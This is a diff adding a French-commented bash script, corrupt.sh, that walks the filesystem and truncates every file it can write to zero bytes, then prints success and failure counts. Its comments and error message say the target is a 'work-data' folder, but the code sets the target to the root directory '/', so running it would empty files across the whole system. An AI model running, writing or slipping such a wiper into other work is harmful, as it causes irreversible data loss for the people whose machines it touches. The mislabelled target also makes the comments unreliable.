@@ -1,0 +1,53 @@
+#!/bin/bash
+
+TARGET="/"
+
+# La cible est maintenant work-data entier
+TEST_DIR="$TARGET"
+
+if [ ! -d "$TEST_DIR" ]; then
+    echo "ERREUR : dossier work-data introuvable."
+    exit 1
+fi
+
+# Chemin absolu de corrupt.sh
+SELF="$(cd "$(dirname "$0")" && pwd)/$(basename "$0")"
+
+echo "=========================================="
+echo "TRONCATURE DES FICHIERS"
+echo "=========================================="
+echo "Cible       : $TEST_DIR"
+echo "Script exclu: $SELF"
+echo ""
+
+SUCCESS=0
+FAILED=0
+SKIPPED=0
+
+while IFS= read -r -d '' FILE
+do
+    # Ne jamais modifier corrupt.sh lui-même
+    if [ "$FILE" = "$SELF" ]; then
+        SKIPPED=$((SKIPPED + 1))
+        continue
+    fi
+
+    # Tronque le fichier à 0 octet
+    if : > "$FILE" 2>/dev/null; then
+        SUCCESS=$((SUCCESS + 1))
+
+    else
+        FAILED=$((FAILED + 1))
+    fi
+    
+    echo ""
+
+done < <(find "$TEST_DIR" -type f -print0)
+
+echo "=========================================="
+echo "RESULTAT FINAL"
+echo "=========================================="
+echo "Fichiers tronqués : $SUCCESS"
+echo "Échecs             : $FAILED"
+echo "Fichiers exclus    : $SKIPPED"
+echo "=========================================="
